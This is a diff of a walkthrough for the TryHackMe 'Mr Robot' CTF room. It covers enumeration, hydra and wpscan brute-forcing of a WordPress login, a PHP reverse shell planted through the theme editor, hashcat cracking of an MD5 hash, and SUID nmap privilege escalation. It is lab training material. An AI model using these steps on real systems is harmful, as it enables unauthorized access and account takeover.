@@ -1,14 +1,15 @@
  
-# Mr Robot ctf
+# [Mr Robot ctf](https://tryhackme.com/room/mrrobot)
+
+difficulty: Medium
 
 <img src="robot.jpeg" width=200 height=200 alt="robot">
 
 Hello friend!
 
+## <u>Enumeration</u>
 
-## Enumeration
-
-### nmap
+### nmap:
 
 ```
 PORT    STATE SERVICE  REASON  VERSION
@@ -45,7 +46,7 @@ PORT    STATE SERVICE  REASON  VERSION
 
 ```
 
-### dirb
+### dirb:
 
 ```
 ---- Scanning URL: http://10.10.82.148/ ----
@@ -65,22 +66,24 @@ PORT    STATE SERVICE  REASON  VERSION
 ```
 The dir discovery was very slow with `gobuster` and `ffuf` for some reason...
 
-Anyway...Coolest website!
+Anyway...Cool website!
 
-Lets visit `robots.txt` (lmao...robots...got it?)
+Lets visit `robots.txt` 
+
+(lmao, robots...got it?)
 
 ```
 User-agent: *
 fsocity.dic
 key-1-of-3.txt
 ```
-Now we got the first key at
+Now we got the first key at:
 
 ```
 http://10.10.82.148/key-1-of-3.txt
 
 ```
-there are some funny stuff in other directories but the next useful thing here is `fsocity.dic` 
+There are some funny stuff in other directories but the next useful thing here is `fsocity.dic` 
 
 we download it and as expected its a dictionary (expect bruteforce)
 
@@ -105,17 +108,17 @@ hydra -L /home/nair0lf32/Desktop/Stuff/THM/mrRobot/fsocity.dic -p test 10.10.82.
 
 ```
 
-`username = Elliot`
+`username = Elliot` (this one is on me)
 
-Then the password...
+Then the password
 
 It was taking mad long so I reduced the dictonary
 
-SORTING AND REMOVING DUPLICATES from your bruteforce dictionaries is vital
+SORTING AND REMOVING DUPLICATES from your bruteforce dictionaries:
 
 `sort fsocity.dic | uniq > fsocity-sorted.dic`
 
-OR
+OR:
 
 `cat fsocity.dic | sort -u | uniq > wordlist.dic`
 
@@ -129,7 +132,7 @@ hydra -l Elliot -P /home/nair0lf32/Desktop/Stuff/THM/mrRobot/fsocity.dic 10.10.8
 [ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experiment" - 357 of 6077 [child 52] (0/0)
 [ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experimental" - 358 of 6077 [child 57] (0/0)
 [ATTEMPT] target 10.10.245.102 - login "Elliot" - pass "experince" - 359 of 6077 [child 58] (0/0)
-[80][http-post-form] host: 10.10.245.102   login: Elliot   password: ER28-0652
+[80][http-post-form] host: 10.10.245.102   login: Elliot   password: [REDACTED]
 1 of 1 target successfully completed, 1 valid password found
 
 ```
@@ -138,94 +141,15 @@ Alternatively you can bruteforce for password with wp-scan:
 wpscan --url 10.10.245.102 --wp-content-dir wp-admin --usernames elliot --passwords /home/nair0lf32/Desktop/Stuff/THM/mrRobot/fsocity-sorted.dic 
 
 ```
-     _______   _____
-\ \        / /  __ \ / ____|
-\ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
-\ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
-\  /\  /  | |     ____) | (__| (_| | | | |
-\/  \/   |_|    |_____/ \___|\__,_|_| |_|
-
-WordPress Security Scanner by the WPScan Team
-Version 3.8.17
-
-@_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
-_______________________________________________________________
-
-[i] Updating the Database ...
-[i] Update completed.
-
-[+] URL: http://10.10.245.102/ [10.10.245.102]
-[+] Started: Sun Oct 24 22:04:01 2021
-
-Interesting Finding(s):
-
-[+] Headers
-| Interesting Entries:
-|  - Server: Apache
-|  - X-Mod-Pagespeed: 1.9.32.3-4523
-| Found By: Headers (Passive Detection)
-| Confidence: 100%
-
-[+] robots.txt found: http://10.10.245.102/robots.txt
-| Found By: Robots Txt (Aggressive Detection)
-| Confidence: 100%
-
-[+] XML-RPC seems to be enabled: http://10.10.245.102/xmlrpc.php
-| Found By: Direct Access (Aggressive Detection)
-| Confidence: 100%
-| References:
-|  - http://codex.wordpress.org/XML-RPC_Pingback_API
-|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
-|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
-|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
-|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-
-[+] The external WP-Cron seems to be enabled: http://10.10.245.102/wp-cron.php
-| Found By: Direct Access (Aggressive Detection)
-| Confidence: 60%
-| References:
-|  - https://www.iplocation.net/defend-wordpress-from-ddos
-|  - https://github.com/wpscanteam/wpscan/issues/1299
-
-[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
-| Found By: Emoji Settings (Passive Detection)
-|  - http://10.10.245.102/4f61287.html, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.3.1'
-| Confirmed By: Meta Generator (Passive Detection)
-|  - http://10.10.245.102/4f61287.html, Match: 'WordPress 4.3.1'
-
-[+] WordPress theme in use: twentyfifteen
-| Location: http://10.10.245.102/wp-admin/themes/twentyfifteen/
-| Last Updated: 2021-07-22T00:00:00.000Z
-| [!] The version is out of date, the latest version is 3.0
-| Style URL: http://10.10.245.102/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
-| Style Name: Twenty Fifteen
-| Style URI: https://wordpress.org/themes/twentyfifteen/
-| Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
-| Author: the WordPress team
-| Author URI: https://wordpress.org/
-|
-| Found By: Css Style In 404 Page (Passive Detection)
-|
-| Version: 1.3 (80% confidence)
-| Found By: Style (Passive Detection)
-|  - http://10.10.245.102/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3'
-
-[+] Enumerating All Plugins (via Passive Methods)
-
-[i] No plugins Found.
-
-[+] Enumerating Config Backups (via Passive and Aggressive Methods)
-Checking Config Backups - Time: 00:00:06 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:06
-
-[i] No Config Backups Found.
+...
 
 [+] Performing password attack on Xmlrpc Multicall against 1 user/s
-[SUCCESS] - elliot / ER28-0652                                                                                                                   
+[SUCCESS] - elliot / [REDACTED]                                                                                                                   
 All Found                                                                                                                                                                   
 Progress Time: 00:02:02 <================================================================================================                                                                                  > (12 / 22) 54.54%  ETA: ??:??:??
 
 [!] Valid Combinations Found:
-| Username: elliot, Password: ER28-0652
+| Username: elliot, Password: [REDACTED]
 
 [!] No WPScan API Token given, as a result vulnerability data has not been output.
 [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
@@ -238,17 +162,22 @@ Progress Time: 00:02:02 <=======================================================
 [+] Memory used: 245.754 MB
 [+] Elapsed time: 00:02:21
 ```
-Burpsuite can be used too but slow for community edition...I didnt try this one
+Burpsuite could be used too but slow for community edition
+
+(I didnt try this one)
 
 So In conclusion the creds are: 
 
-`Elliot:ER28-0652`
+`Elliot:[REDACTED]`
 
 Login with those And get to the admin dashboard!
+## <u>Exploitation</u>
 
 Now getting access is classic stuff
 
-In appearance editor just edit or add a page with a `php reverse shell` (404.php by example)
+In appearance editor just edit or add a page with a `php reverse shell` 
+
+(404.php by example)
 
 And get access on your netcat listener
 
@@ -264,7 +193,7 @@ $ cat key-2-of-3.txt
 cat: key-2-of-3.txt: Permission denied
 
 ```
-yeah its a medium room...what did we expect? XD
+yeah its a medium room...what did we expect?
 
 `password.raw-md5` looks promising
 
@@ -287,7 +216,7 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+c3fcd3d76192e4007dfb496cca67e13b:[REDACTED]
                                                  
 Session..........: hashcat
 Status...........: Cracked
@@ -308,7 +237,7 @@ Candidates.#1....: treetree -> loserface1
 ```
 I think even crackstation could find it!
 
-`robot:abcdefghijklmnopqrstuvwxyz`
+`robot:[REDACTED]`
 
 Now switch to robot and get that 2nd key
 
@@ -328,7 +257,7 @@ cat key-2-of-3.txt
 ...
 ```
 
-## privilege escalation
+## <u>privilege escalation</u>
 
 First step failed
 
@@ -364,7 +293,7 @@ find / -perm -u=s -type f 2>/dev/null
 /usr/lib/pt_chown
 
 ```
-GTFObins say nmap is suspicious and therefore
+GTFObins say nmap is suspicious and therefore...
 
 ```
 robot@linux:~$ nmap --interactive     
@@ -401,13 +330,9 @@ cat key-3-of-3.txt
 ...
 
 ```
-Incredible room!
+Incredible room! Now for the culture, do this:
 
 ```
 # echo "leave me here!" > readme.txt
 ```
 Goodbye friend!
-
-
-
-
